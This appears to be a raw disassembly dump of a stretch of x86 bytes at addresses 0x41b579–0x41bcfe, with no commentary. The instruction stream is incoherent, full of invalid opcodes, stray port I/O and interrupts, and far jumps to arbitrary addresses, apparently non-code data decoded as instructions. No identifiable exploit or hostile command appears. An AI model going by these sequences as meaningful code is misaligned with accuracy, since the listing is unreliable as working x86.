  41b579:	addr16 pop ecx
  41b57b:	imul   ecx,DWORD PTR [ebx+0x57f8c18c],0x2f
  41b582:	sub    eax,0xbc24f0d3
  41b587:	out    dx,eax
  41b588:	rcl    BYTE PTR [ecx-0x373c750d],1
  41b58e:	imul   esi,DWORD PTR [esi],0x2
  41b591:	loope  0x41b5e1
  41b593:	mov    bh,BYTE PTR [esi]
  41b595:	adc    cl,BYTE PTR [ebx]
  41b597:	lods   eax,DWORD PTR ds:[esi]
  41b598:	push   eax
  41b599:	and    dh,BYTE PTR [ecx+esi*1-0x2e5bb617]
  41b5a0:	xor    eax,0xcac07c7b
  41b5a5:	push   ecx
  41b5a6:	div    DWORD PTR [eax-0x66]
  41b5a9:	sahf   
  41b5aa:	imul   eax,esi,0x73640e60
  41b5b0:	dec    edx
  41b5b1:	or     DWORD PTR [ecx+0x3b40da19],edi
  41b5b7:	mov    ah,0xf6
  41b5b9:	and    cl,ch
  41b5bb:	data16 jae 0x41b55a
  41b5be:	add    eax,0x5381fac2
  41b5c3:	cld    
  41b5c4:	scas   al,BYTE PTR es:[edi]
  41b5c5:	pop    ebx
  41b5c6:	xlat   BYTE PTR ds:[ebx]
  41b5c7:	pop    esi
  41b5c8:	xor    bl,BYTE PTR [esi+0x3b3c7e1a]
  41b5ce:	hlt    
  41b5cf:	outs   dx,DWORD PTR ds:[esi]
  41b5d0:	ins    BYTE PTR es:[edi],dx
  41b5d1:	dec    eax
  41b5d2:	add    edx,ebp
  41b5d4:	iret   
  41b5d5:	sub    dl,BYTE PTR [ecx+0x55]
  41b5d8:	adc    al,dl
  41b5da:	cdq    
  41b5db:	jl     0x41b643
  41b5dd:	aas    
  41b5de:	sub    ebp,DWORD PTR [edx-0x1596828f]
  41b5e4:	int3   
  41b5e5:	and    al,dl
  41b5e7:	cmp    BYTE PTR [ebp-0x5b],bh
  41b5ea:	mov    edi,DWORD PTR [ebx-0x45b2aca3]
  41b5f0:	fcmovu st,st(0)
  41b5f2:	nop
  41b5f3:	loopne 0x41b64c
  41b5f5:	cwde   
  41b5f6:	jmp    0xd7b4:0x42012f5a
  41b5fd:	sahf   
  41b5fe:	ds push edx
  41b600:	test   BYTE PTR [esi-0x34],dl
  41b603:	mov    BYTE PTR [edx-0xb],ah
  41b606:	int    0x5
  41b608:	cmp    dh,BYTE PTR [esi]
  41b60a:	repnz adc ax,0xb2f9
  41b60f:	fwait
  41b610:	jnp    0x41b668
  41b612:	push   ebx
  41b613:	(bad)  
  41b614:	cmp    al,0xdb
  41b616:	xchg   BYTE PTR [esi-0x15],ah
  41b619:	or     cl,dh
  41b61b:	cmc    
  41b61c:	inc    ebp
  41b61d:	xor    esp,DWORD PTR [edi+edx*1]
  41b620:	push   0xcc61dc8c
  41b625:	mov    WORD PTR [eax-0x20],ss
  41b628:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41b62a:	fwait
  41b62b:	pop    es
  41b62c:	in     eax,dx
  41b62d:	jae    0x41b64c
  41b62f:	aas    
  41b630:	sbb    edi,edi
  41b632:	das    
  41b633:	je     0x41b684
  41b635:	and    DWORD PTR [edi+0xc110ec4],edi
  41b63b:	sar    BYTE PTR [ebx],1
  41b63d:	adc    al,0xac
  41b63f:	fcmovne st,st(4)
  41b641:	mov    eax,0x7863f5f4
  41b646:	pop    esi
  41b647:	mov    ds,WORD PTR [edx+0x2c]
  41b64a:	mov    ecx,0x8a73ce42
  41b64f:	push   0x17fa9785
  41b654:	cdq    
  41b655:	cmc    
  41b656:	pop    ebx
  41b657:	loope  0x41b684
  41b659:	call   0xcfbf:0x41f1ac99
  41b660:	call   0x44b4fe9e
  41b665:	sub    al,0x61
  41b667:	push   0x79ead0f5
  41b66c:	add    DWORD PTR [ecx],0x5ac3cb17
  41b672:	outs   dx,DWORD PTR ds:[esi]
  41b673:	std    
  41b674:	test   DWORD PTR [eax+0x12a22b52],ecx
  41b67a:	lods   eax,DWORD PTR ds:[esi]
  41b67b:	pop    ds
  41b67c:	mov    al,0x44
  41b67e:	or     BYTE PTR [eax+esi*2],bl
  41b681:	mov    eax,0xb9b5757
  41b686:	xchg   ebx,eax
  41b687:	mov    dh,0xe2
  41b689:	out    0xe2,eax
  41b68b:	test   DWORD PTR [esi+0x25b003a8],ebp
  41b691:	pop    esi
  41b692:	adc    eax,0xddc458c5
  41b697:	xchg   esp,eax
  41b698:	call   0xad02b9e3
  41b69d:	and    DWORD PTR ds:0x9bf5fbb5,edx
  41b6a3:	jecxz  0x41b65b
  41b6a5:	cmp    DWORD PTR [ecx],edx
  41b6a7:	sbb    DWORD PTR [esi-0x73a56cba],edx
  41b6ad:	rcl    BYTE PTR [ebx+0x46ec5f1f],cl
  41b6b3:	mov    ebp,0x9d16562a
  41b6b8:	sbb    eax,0x469599d4
  41b6bd:	mov    al,ds:0xec00944e
  41b6c2:	xchg   edx,eax
  41b6c3:	sbb    BYTE PTR [edi-0x77],bl
  41b6c6:	clc    
  41b6c7:	sbb    eax,0x6bb6f71f
  41b6cc:	cmp    cl,0x64
  41b6cf:	aaa    
  41b6d0:	xchg   ebx,eax
  41b6d1:	xchg   esi,eax
  41b6d2:	inc    eax
  41b6d3:	xchg   edi,eax
  41b6d4:	cmp    edi,0x4c
  41b6d7:	xchg   esi,eax
  41b6d8:	jmp    0x8f36:0xb935be6a
  41b6df:	push   cs
  41b6e0:	push   edx
  41b6e1:	xlat   BYTE PTR ds:[ebx]
  41b6e2:	imul   ebp,DWORD PTR [eax+edx*1],0xffffffe9
  41b6e6:	js     0x41b75d
  41b6e8:	xor    edi,eax
  41b6ea:	(bad)  
  41b6eb:	xchg   esp,eax
  41b6ec:	sbb    eax,0x5d103973
  41b6f1:	test   DWORD PTR [ebx],esp
  41b6f3:	test   DWORD PTR [edi],0xd4fb4c99
  41b6f9:	xchg   ebx,eax
  41b6fa:	mov    eax,ds:0xd8b606f2
  41b6ff:	repz sub DWORD PTR [ecx],0x30
  41b703:	out    dx,al
  41b704:	mov    ds:0xdd34f5f6,al
  41b709:	xor    DWORD PTR [eax-0x31],0x2b
  41b70d:	rcr    BYTE PTR [eax+0x708f1113],cl
  41b713:	inc    ecx
  41b714:	lock imul ecx,DWORD PTR [ebp+0x6a03e33f],0x6e
  41b71c:	loope  0x41b77b
  41b71e:	xor    DWORD PTR [edi+0x51],edi
  41b721:	std    
  41b722:	pop    edx
  41b723:	aad    0x8
  41b725:	push   ecx
  41b726:	ret    0x3e36
  41b729:	sbb    al,0x95
  41b72b:	mov    bl,0x96
  41b72d:	push   ss
  41b72e:	imul   ebx,esp,0xa2304781
  41b734:	mov    ds:0xc3fe762c,al
  41b739:	test   eax,0xbec8270
  41b73e:	fstp   st(2)
  41b740:	add    eax,0xc6ece41e
  41b745:	dec    ecx
  41b746:	lods   eax,DWORD PTR ds:[esi]
  41b747:	or     al,0x35
  41b749:	ret    
  41b74a:	(bad)  
  41b74c:	pop    ecx
  41b74d:	arpl   bp,si
  41b74f:	dec    edi
  41b750:	inc    ebx
  41b751:	call   DWORD PTR [ebx+eax*8]
  41b754:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b755:	addr16 sar ah,1
  41b758:	cmp    al,0xf7
  41b75a:	jle    0x41b714
  41b75c:	mov    WORD PTR [ecx],gs
  41b75e:	push   0xffffffb3
  41b760:	nop
  41b761:	(bad)  [ecx]
  41b763:	es stos DWORD PTR es:[edi],eax
  41b765:	xor    al,0xac
  41b767:	fnstenv [edi+0x62]
  41b76a:	cmp    BYTE PTR [ebx],0x38
  41b76d:	adc    eax,0xc64e588c
  41b772:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b773:	jl     0x41b70f
  41b775:	leave  
  41b776:	mov    bh,0x17
  41b778:	je     0x41b6ff
  41b77a:	inc    ebp
  41b77b:	call   0xd7517363
  41b780:	mov    eax,0x2add80da
  41b785:	cli    
  41b786:	lods   eax,DWORD PTR ds:[esi]
  41b787:	into   
  41b788:	inc    edx
  41b789:	jmp    0xf774:0x239d6d4f
  41b790:	cmp    cl,ah
  41b792:	inc    edi
  41b793:	sub    BYTE PTR [ebp+0xf0e7310],0x68
  41b79a:	jb     0x41b7d2
  41b79c:	popa   
  41b79d:	cdq    
  41b79e:	mov    eax,0x750d10ab
  41b7a3:	push   esi
  41b7a4:	test   eax,0xc28b7141
  41b7a9:	pop    edi
  41b7aa:	jb     0x41b730
  41b7ac:	aam    0xf6
  41b7ae:	push   es
  41b7af:	pop    es
  41b7b0:	mov    eax,0x15b266d6
  41b7b5:	pop    ds
  41b7b6:	aam    0x6e
  41b7b8:	outs   dx,BYTE PTR ds:[esi]
  41b7b9:	sti    
  41b7ba:	rcr    DWORD PTR [esi-0x64],cl
  41b7bd:	movups xmm5,xmm4
  41b7c0:	popf   
  41b7c1:	in     al,dx
  41b7c2:	push   0x63
  41b7c4:	xchg   esi,eax
  41b7c5:	ins    DWORD PTR es:[edi],dx
  41b7c6:	test   al,0xff
  41b7c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7c9:	jae    0x41b7c8
  41b7cb:	stos   DWORD PTR es:[edi],eax
  41b7cc:	(bad)  
  41b7cd:	pop    eax
  41b7ce:	sub    al,0xf
  41b7d0:	lock fsub st(3),st
  41b7d3:	ins    DWORD PTR es:[edi],dx
  41b7d4:	int    0x9f
  41b7d6:	pop    ebp
  41b7d7:	xlat   BYTE PTR ds:[ebx]
  41b7d8:	(bad)  
  41b7d9:	mov    esp,DWORD PTR [esp+ecx*4]
  41b7dc:	sbb    ebp,esi
  41b7de:	cld    
  41b7df:	cdq    
  41b7e0:	jne    0x41b7fc
  41b7e2:	jge    0x41b7e0
  41b7e4:	rol    BYTE PTR [edx-0x114092bc],cl
  41b7ea:	leave  
  41b7eb:	xchg   edx,eax
  41b7ec:	ins    BYTE PTR es:[edi],dx
  41b7ed:	hlt    
  41b7ee:	dec    BYTE PTR [ecx]
  41b7f0:	mov    bh,BYTE PTR [eax]
  41b7f2:	push   es
  41b7f3:	test   al,0x62
  41b7f5:	ins    DWORD PTR es:[edi],dx
  41b7f6:	dec    edi
  41b7f7:	imul   esi,DWORD PTR ds:0x5ab5c090,0x6d
  41b7fe:	lds    eax,FWORD PTR [ebx+0xd1e96d3]
  41b804:	test   DWORD PTR [edx-0x25323df9],ebp
  41b80a:	jb     0x41b868
  41b80c:	or     BYTE PTR [edx+0x5d],al
  41b80f:	mov    esp,0x1b9c14c
  41b814:	sub    eax,DWORD PTR [ebx+0x1a428b37]
  41b81a:	test   DWORD PTR [edi-0x28],ecx
  41b81d:	xor    DWORD PTR [ebp+0x5e],ebx
  41b820:	retf   0x4d66
  41b823:	jno    0x41b86e
  41b825:	adc    DWORD PTR [eax],ebx
  41b827:	arpl   dx,ax
  41b829:	or     BYTE PTR [eax+0x107ca25a],0xe3
  41b830:	sbb    eax,0xeff887f7
  41b835:	add    ch,BYTE PTR ds:0x4efd75ee
  41b83b:	sub    BYTE PTR [ecx-0x78fa6029],bl
  41b841:	xchg   ebx,eax
  41b842:	rcl    DWORD PTR [eax+0x79],1
  41b845:	(bad)
  41b848:	mov    ecx,0x9411465b
  41b84d:	bound  edi,QWORD PTR [eax-0x7d]
  41b850:	repnz enter 0xf048,0xb7
  41b855:	sbb    DWORD PTR [ecx+0x78],ecx
  41b858:	data16 sar cl,cl
  41b85b:	imul   esi,edi,0xffffffe2
  41b85e:	ret    0xcf2
  41b861:	leave  
  41b862:	loopne 0x41b823
  41b864:	xor    bh,BYTE PTR [ecx+0x7]
  41b867:	xor    DWORD PTR [eax-0x64],0x69
  41b86b:	inc    esp
  41b86c:	hlt    
  41b86d:	shl    BYTE PTR [edx-0x55d24ea9],1
  41b873:	pop    es
  41b874:	inc    ebp
  41b875:	xor    eax,0x88da9cf5
  41b87a:	xor    al,0x61
  41b87c:	(bad)  
  41b87d:	pusha  
  41b87e:	rcr    BYTE PTR [esi],cl
  41b880:	adc    edx,0x87370cc6
  41b886:	mov    esp,0x8c89deae
  41b88b:	sbb    eax,DWORD PTR [edx]
  41b88d:	sbb    BYTE PTR [ecx-0x22bbca40],0xc9
  41b894:	and    dh,dl
  41b896:	fimul  WORD PTR [eax+ecx*2+0x1918c952]
  41b89d:	mov    esi,0x9e899c57
  41b8a2:	das    
  41b8a3:	jmp    0x5748:0xd10c5017
  41b8aa:	push   es
  41b8ab:	jns    0x41b8f9
  41b8ad:	or     eax,0x9f787058
  41b8b2:	or     ch,dh
  41b8b4:	and    DWORD PTR [ecx],0x7950957c
  41b8ba:	xchg   ebp,eax
  41b8bb:	out    0xb7,eax
  41b8bd:	jg     0x41b92c
  41b8bf:	mov    eax,0x688764b9
  41b8c4:	ins    BYTE PTR es:[edi],dx
  41b8c5:	mov    al,ds:0x281268d5
  41b8ca:	mov    al,ds:0x2592ca32
  41b8cf:	hlt    
  41b8d0:	mov    cl,0xc8
  41b8d2:	xchg   ebx,eax
  41b8d3:	lock dec esp
  41b8d5:	push   cs
  41b8d6:	iret   
  41b8d7:	fmulp  st(5),st
  41b8d9:	jmp    0xdd79:0xbab15b5b
  41b8e0:	cmp    edx,DWORD PTR [esi]
  41b8e2:	mov    dl,0xb2
  41b8e4:	fldcw  WORD PTR [ebx]
  41b8e6:	outs   dx,DWORD PTR ds:[esi]
  41b8e7:	(bad)  
  41b8e8:	push   0xffffffbf
  41b8ea:	inc    ecx
  41b8eb:	aas    
  41b8ec:	ror    esi,1
  41b8ee:	push   edi
  41b8ef:	sbb    BYTE PTR ds:0x494ca5a3,0x87
  41b8f6:	cmp    BYTE PTR [eax],dl
  41b8f8:	and    BYTE PTR [ebx*8-0x15014e49],bl
  41b8ff:	or     al,0x4d
  41b901:	dec    edx
  41b902:	lahf   
  41b903:	lods   eax,DWORD PTR ds:[esi]
  41b904:	out    dx,eax
  41b905:	xchg   edx,eax
  41b906:	inc    edi
  41b907:	xchg   cl,bh
  41b909:	inc    ebp
  41b90a:	ret    
  41b90b:	sbb    dh,bh
  41b90d:	and    bl,BYTE PTR [edx+0x1ecde2b7]
  41b913:	dec    edi
  41b914:	loopne 0x41b8ce
  41b916:	fidivr DWORD PTR [ecx-0x66]
  41b919:	pop    dx
  41b91b:	cmc    
  41b91c:	dec    esi
  41b91d:	and    eax,0x710dfcb6
  41b922:	(bad)  
  41b923:	repz retf 
  41b925:	shl    dl,1
  41b927:	(bad)  
  41b928:	shl    DWORD PTR [eax+0x3f],1
  41b92b:	xor    BYTE PTR [ecx],dh
  41b92d:	inc    ebp
  41b92e:	cmp    DWORD PTR [ecx+0x5fd1fb90],0x35
  41b935:	pop    esi
  41b936:	lock and al,0x9e
  41b939:	ds ss pushf 
  41b93c:	sbb    eax,0x1771eade
  41b941:	ins    DWORD PTR es:[edi],dx
  41b942:	hlt    
  41b943:	inc    ebp
  41b944:	cmc    
  41b945:	leave  
  41b946:	dec    edi
  41b947:	inc    eax
  41b948:	xchg   DWORD PTR [edi+0x34cdedf],ecx
  41b94e:	adc    eax,0x9bf11bc2
  41b953:	sub    eax,0x8454ddf0
  41b958:	leave  
  41b959:	sbb    eax,0x1231aeea
  41b95e:	lds    edx,FWORD PTR [esi+0x2b895141]
  41b964:	or     eax,DWORD PTR [ebx]
  41b966:	mul    DWORD PTR [ebp*2+0x206dded9]
  41b96d:	add    al,0xca
  41b96f:	push   cs
  41b970:	sbb    DWORD PTR [edi+0x73],esi
  41b973:	loop   0x41b981
  41b975:	fidiv  WORD PTR [edi-0x7]
  41b978:	ins    BYTE PTR es:[edi],dx
  41b979:	neg    DWORD PTR [eax+0x63]
  41b97c:	push   ss
  41b97d:	fnsave [ebx+eax*8+0x7eee63db]
  41b984:	adc    BYTE PTR [ebp*4-0x1f5247cc],ch
  41b98b:	xchg   esi,eax
  41b98c:	mov    eax,ds:0x26b616a5
  41b991:	sub    al,dh
  41b993:	sbb    al,0x1b
  41b995:	lea    edx,[ebx-0x15]
  41b998:	sar    DWORD PTR [ebx+edi*8+0x6c],0x60
  41b99d:	jecxz  0x41b972
  41b99f:	gs sub al,0x3f
  41b9a2:	mov    ds:0x7396a7b7,eax
  41b9a7:	jp     0x41b93a
  41b9a9:	mov    edx,0xab7444c6
  41b9ae:	jns    0x41b98b
  41b9b0:	mov    edi,0x19806552
  41b9b5:	not    DWORD PTR [edi+0x43466eac]
  41b9bb:	test   al,0x9a
  41b9bd:	repnz mov al,ds:0x70d9efad
  41b9c3:	jmp    0xb46a644d
  41b9c8:	jmp    0x41b953
  41b9ca:	mov    eax,0xb449ee68
  41b9cf:	or     eax,esi
  41b9d1:	push   0x2b
  41b9d3:	out    dx,al
  41b9d4:	sub    al,0x77
  41b9d6:	push   ds
  41b9d7:	xor    ecx,esp
  41b9d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9da:	mov    ch,0xc6
  41b9dc:	neg    cl
  41b9de:	lea    ecx,[eax+0x236ee0e]
  41b9e4:	leave  
  41b9e5:	sub    BYTE PTR [esp+ecx*4],dl
  41b9e8:	iret   
  41b9e9:	retf   0x2849
  41b9ec:	aas    
  41b9ed:	jnp    0x41b9fc
  41b9ef:	cld    
  41b9f0:	sub    ebx,DWORD PTR [edi+0x36]
  41b9f3:	pop    esp
  41b9f4:	jp     0x41b9d0
  41b9f6:	mov    esp,0x702864ef
  41b9fb:	inc    edi
  41b9fc:	dec    ecx
  41b9fd:	in     eax,dx
  41b9fe:	xchg   ebp,eax
  41b9ff:	into   
  41ba00:	(bad)  
  41ba01:	scas   al,BYTE PTR es:[edi]
  41ba02:	mov    ebx,0x5da5cb7c
  41ba07:	jmp    0x97be7cfb
  41ba0c:	dec    edx
  41ba0d:	cli    
  41ba0e:	fiadd  WORD PTR [ecx]
  41ba10:	cmc    
  41ba11:	inc    ebx
  41ba12:	push   ss
  41ba13:	mov    BYTE PTR [edi],cl
  41ba15:	pushf  
  41ba16:	mov    esi,0x8824147e
  41ba1b:	pop    ebx
  41ba1c:	mul    DWORD PTR [edx+0x5b]
  41ba1f:	xchg   ecx,eax
  41ba20:	or     BYTE PTR [ecx],dl
  41ba22:	sub    DWORD PTR [ecx+0x35],esi
  41ba25:	aam    0x7a
  41ba27:	pop    esi
  41ba28:	ret    
  41ba29:	add    DWORD PTR [ebx-0x69],ebx
  41ba2c:	(bad)  
  41ba2d:	mov    dl,0x72
  41ba2f:	addr16 out dx,eax
  41ba31:	or     edi,DWORD PTR [eax]
  41ba33:	sar    BYTE PTR [ebp+0x5cd2379e],1
  41ba39:	xchg   DWORD PTR [ebx],ebp
  41ba3b:	adc    al,0xad
  41ba3d:	lods   al,BYTE PTR ds:[esi]
  41ba3e:	enter  0x4c35,0xe0
  41ba42:	ja     0x41ba5b
  41ba44:	pop    edx
  41ba45:	push   0x57
  41ba47:	cld    
  41ba48:	inc    ebx
  41ba49:	jmp    0xea7552f8
  41ba4e:	retf   0x660
  41ba51:	add    DWORD PTR [edx+0x4f1c842c],ebp
  41ba57:	mov    ecx,?
  41ba59:	jbe    0x41ba88
  41ba5b:	movnti DWORD PTR [ebx+0xf],edi
  41ba5f:	pushf  
  41ba60:	inc    ecx
  41ba61:	pop    ebp
  41ba62:	sbb    ch,BYTE PTR ds:0x9fa28e5d
  41ba68:	mov    dl,0x7
  41ba6a:	sti    
  41ba6b:	lock jnp 0x41bab9
  41ba6e:	jo     0x41ba50
  41ba70:	or     eax,0x39d98b3d
  41ba75:	iret   
  41ba76:	mov    al,0x5
  41ba78:	inc    ebx
  41ba79:	call   0xc900:0xe367c640
  41ba80:	cmp    DWORD PTR [ecx+0x40b7426a],ebx
  41ba86:	push   esi
  41ba87:	mov    BYTE PTR [eax-0x1c],dh
  41ba8a:	and    edi,ebp
  41ba8c:	jns    0x41ba95
  41ba8e:	int    0xa6
  41ba90:	mov    ds:0x66ebaba5,eax
  41ba95:	outs   dx,DWORD PTR ds:[esi]
  41ba97:	jns    0x41baf8
  41ba99:	and    dl,BYTE PTR [ecx+0xb]
  41ba9c:	ret    
  41ba9d:	mov    esi,gs
  41ba9f:	repnz imul esp,DWORD PTR es:[ecx+0x3ea088a2],0xffffffc6
  41baa8:	bound  esp,QWORD PTR [esi+0x61]
  41baab:	cmp    BYTE PTR [eax],ah
  41baad:	sbb    BYTE PTR [ebx-0x68],0x61
  41bab1:	jne    0x41bb2b
  41bab3:	pop    ebp
  41bab4:	sub    eax,0x41a211ef
  41bab9:	push   ebx
  41baba:	pop    esi
  41babb:	xor    al,dh
  41babd:	inc    edx
  41babe:	xchg   ebp,eax
  41babf:	daa    
  41bac0:	fcmove st,st(0)
  41bac2:	pop    esp
  41bac3:	add    ch,BYTE PTR [edx+0x5a]
  41bac6:	jp     0x41ba79
  41bac8:	add    DWORD PTR [esi+0x25],esp
  41bacb:	shr    BYTE PTR [ecx+0x6e6e0ebf],cl
  41bad1:	mov    bl,0x15
  41bad3:	scas   eax,DWORD PTR es:[edi]
  41bad4:	imul   eax,DWORD PTR [ecx+0x73],0xfffffffc
  41bad8:	dec    eax
  41bad9:	sub    BYTE PTR [eax-0x6e1bbcac],0xc5
  41bae0:	pop    ebp
  41bae1:	or     esi,DWORD PTR [ebx+0x7f25cca1]
  41bae7:	aad    0xd8
  41bae9:	mov    dh,BYTE PTR [edi+0x488bd941]
  41baef:	xchg   BYTE PTR [eax-0x10],dh
  41baf2:	mov    edx,0x6d7fa8f
  41baf7:	(bad)  
  41baf8:	loope  0x41ba83
  41bafa:	int    0x4c
  41bafc:	clc    
  41bafd:	sub    al,0xab
  41baff:	or     al,0x3e
  41bb01:	data16 fwait
  41bb03:	mov    dh,bh
  41bb05:	lods   al,BYTE PTR ds:[esi]
  41bb06:	ins    DWORD PTR es:[edi],dx
  41bb07:	push   edi
  41bb08:	jg     0x41bb89
  41bb0a:	enter  0x5ebd,0x8c
  41bb0e:	xchg   DWORD PTR [ebp+0x786f10a2],ebx
  41bb14:	jns    0x41bb34
  41bb16:	add    edx,ecx
  41bb18:	stc    
  41bb19:	bound  edi,QWORD PTR [edx-0x22e72cff]
  41bb1f:	push   ecx
  41bb20:	inc    esi
  41bb21:	mov    ebx,0x17ec944e
  41bb26:	data16 int 0xc2
  41bb29:	popf   
  41bb2a:	or     bl,al
  41bb2c:	lods   eax,DWORD PTR ds:[esi]
  41bb2d:	arpl   WORD PTR [edx],bx
  41bb2f:	mov    edi,0xcf54b9ba
  41bb34:	enter  0x98c1,0xb0
  41bb38:	dec    esi
  41bb39:	sub    esi,DWORD PTR [ebx+ecx*1-0x316c11e2]
  41bb40:	or     ebx,ecx
  41bb42:	cmp    DWORD PTR [ebx+0x7a56ddbd],ecx
  41bb48:	mov    dh,BYTE PTR [eax]
  41bb4a:	and    BYTE PTR [eax-0x63b9fe01],0xd0
  41bb51:	jae    0x41bb6b
  41bb53:	mov    ah,0xe2
  41bb55:	dec    edi
  41bb56:	popf   
  41bb57:	and    eax,0xa6d384e
  41bb5c:	or     ebp,DWORD PTR [ebp-0x2d58f6cf]
  41bb62:	xchg   si,ax
  41bb64:	mov    ds:0x93eb88e1,al
  41bb69:	push   esi
  41bb6a:	jo     0x41bb26
  41bb6c:	adc    edi,DWORD PTR [ebx+0x47]
  41bb6f:	fist   WORD PTR [edi]
  41bb71:	rcl    BYTE PTR [esi],cl
  41bb73:	push   cs
  41bb74:	repnz div DWORD PTR [ecx]
  41bb77:	mov    ebx,0xe459583f
  41bb7c:	cmp    BYTE PTR [edx],0x64
  41bb7f:	mov    eax,0x4f205695
  41bb84:	sub    ah,BYTE PTR [esi-0x71c7512d]
  41bb8a:	or     DWORD PTR [ebp+0x169e5821],eax
  41bb90:	test   al,0x5b
  41bb92:	sbb    DWORD PTR [eax-0x50fca50],ebp
  41bb98:	call   0x585b9bd2
  41bb9d:	dec    esp
  41bb9e:	scas   al,BYTE PTR es:[edi]
  41bb9f:	pop    edx
  41bba0:	fld    QWORD PTR [eax-0x2ac38ab6]
  41bba6:	push   eax
  41bba7:	fwait
  41bba8:	dec    edi
  41bba9:	cwde   
  41bbaa:	adc    DWORD PTR [ecx-0x6b8df846],ebx
  41bbb0:	daa    
  41bbb1:	jecxz  0x41bc0b
  41bbb3:	mov    ch,dl
  41bbb5:	retf   
  41bbb6:	mov    ds:0xaea0f123,eax
  41bbbb:	push   cs
  41bbbc:	stos   DWORD PTR es:[edi],eax
  41bbbd:	pop    ecx
  41bbbe:	(bad)  
  41bbbf:	ins    DWORD PTR es:[edi],dx
  41bbc0:	pop    ebx
  41bbc1:	and    esi,DWORD PTR ds:0x8b8ed89c
  41bbc7:	pop    ebp
  41bbc8:	xchg   esi,eax
  41bbc9:	pop    esi
  41bbca:	mov    edx,0x295d0e3e
  41bbcf:	adc    DWORD PTR [eax-0x4b],ecx
  41bbd2:	adc    edx,DWORD PTR [esi-0x5]
  41bbd5:	dec    esi
  41bbd6:	in     al,0x4e
  41bbd8:	mov    edx,0x72cff6fb
  41bbdd:	mov    ds:0x3ac271df,eax
  41bbe2:	inc    ebx
  41bbe3:	jg     0x41bb72
  41bbe5:	add    al,0x60
  41bbe7:	jl     0x41bbb8
  41bbe9:	xor    al,0x98
  41bbeb:	mov    eax,ds:0xdc868436
  41bbf0:	(bad)  
  41bbf1:	stc    
  41bbf2:	push   edx
  41bbf3:	mov    esi,0x463c969e
  41bbf8:	fisubr WORD PTR [ecx-0x286d2d03]
  41bbfe:	jns    0x41bc08
  41bc00:	adc    al,0xda
  41bc03:	mov    ebx,DWORD PTR [edx]
  41bc05:	push   ebx
  41bc06:	mov    cs,WORD PTR [ebp-0x3dbc70c6]
  41bc0c:	clc    
  41bc0d:	add    al,0x8f
  41bc0f:	or     eax,0xd46b2559
  41bc14:	and    edi,DWORD PTR [edi-0xbecd4c4]
  41bc1a:	jl     0x41bc3b
  41bc1c:	fcomp  st(7)
  41bc1e:	leave  
  41bc1f:	push   edi
  41bc20:	(bad)  
  41bc21:	or     eax,0xe2e1c245
  41bc26:	cmp    DWORD PTR [ebx],0x2
  41bc29:	push   ss
  41bc2a:	push   eax
  41bc2b:	jmp    0x41bbe4
  41bc2d:	or     BYTE PTR [ecx],bl
  41bc2f:	mov    dh,0xc1
  41bc31:	test   eax,0xeee0371
  41bc36:	mov    ecx,0xbdb6af18
  41bc3b:	mov    BYTE PTR [ebp+0x11],dh
  41bc3e:	pop    ds
  41bc3f:	push   esi
  41bc40:	mov    esp,0x7c132aab
  41bc45:	jb     0x41bbd9
  41bc47:	aaa    
  41bc48:	adc    DWORD PTR [eax],0xba23289e
  41bc4e:	xchg   ebx,eax
  41bc4f:	push   esi
  41bc50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc51:	inc    edi
  41bc52:	pop    ebx
  41bc53:	add    DWORD PTR [edi],ebx
  41bc55:	lahf   
  41bc56:	adc    eax,DWORD PTR [eax]
  41bc58:	xor    eax,0x597a17bd
  41bc5d:	outs   dx,DWORD PTR ds:[esi]
  41bc5e:	lea    eax,[ebp+ebx*2-0x78]
  41bc62:	je     0x41bc8e
  41bc64:	mov    dh,0xf8
  41bc66:	sub    DWORD PTR [eax],esi
  41bc68:	jb     0x41bc86
  41bc6a:	out    dx,al
  41bc6b:	push   ss
  41bc6c:	int3   
  41bc6d:	push   esi
  41bc6e:	rol    ah,cl
  41bc70:	pusha  
  41bc71:	jbe    0x41bcc9
  41bc73:	mov    bl,0x8d
  41bc75:	mov    dh,0xcd
  41bc77:	xchg   esp,eax
  41bc78:	call   0x829e0854
  41bc7d:	push   ebp
  41bc7e:	bound  eax,QWORD PTR [ecx]
  41bc80:	scas   al,BYTE PTR es:[edi]
  41bc81:	add    DWORD PTR [ecx-0x2eee07b2],eax
  41bc87:	mov    ecx,0xccee7124
  41bc8c:	push   ebx
  41bc8d:	mov    bl,0x60
  41bc8f:	inc    ecx
  41bc90:	retf   0x458e
  41bc93:	scas   eax,DWORD PTR es:[edi]
  41bc94:	cmp    edi,DWORD PTR [ebx-0x7c]
  41bc97:	sbb    al,cl
  41bc99:	scas   eax,DWORD PTR es:[edi]
  41bc9a:	xor    BYTE PTR [edi+eiz*8-0xe],dl
  41bc9e:	(bad)  
  41bc9f:	sub    BYTE PTR [edx+0x43f5db16],al
  41bca5:	ins    DWORD PTR es:[edi],dx
  41bca6:	or     eax,0x1d49d1fb
  41bcab:	fwait
  41bcac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bcad:	adc    BYTE PTR [edx+0x5d58935c],dl
  41bcb3:	lods   eax,DWORD PTR ds:[esi]
  41bcb4:	call   0x96df:0x18f703e
  41bcbb:	imul   ecx,DWORD PTR [ecx],0xd
  41bcbe:	jge    0x41bcd3
  41bcc0:	hlt    
  41bcc1:	mov    al,0x56
  41bcc3:	pop    ecx
  41bcc4:	jmp    0x41bcd7
  41bcc6:	(bad)  
  41bcc7:	outs   dx,DWORD PTR ds:[esi]
  41bcc8:	rcr    DWORD PTR [edi+esi*4-0x10],1
  41bccc:	mov    ds:0x98787ae6,al
  41bcd1:	pop    esp
  41bcd2:	mov    bl,0xa
  41bcd4:	outs   dx,BYTE PTR ds:[esi]
  41bcd5:	pop    ebx
  41bcd6:	cmp    eax,0x1df80fef
  41bcdb:	fisubr DWORD PTR [ebx-0x31]
  41bcde:	pop    ss
  41bcdf:	sbb    ah,bl
  41bce1:	mov    ebx,0x7cc6d29e
  41bce6:	lahf   
  41bce7:	or     bh,0x0
  41bcea:	push   ebx
  41bceb:	lea    edx,ds:0xfc9aa669
  41bcf1:	mov    ch,0x71
  41bcf3:	pop    ebp
  41bcf4:	adc    cl,BYTE PTR [ebx-0x6858cdde]
  41bcfa:	loope  0x41bccd
  41bcfc:	adc    esi,ecx
  41bcfe:	ficom  WORD PTR [ecx+eiz*8]
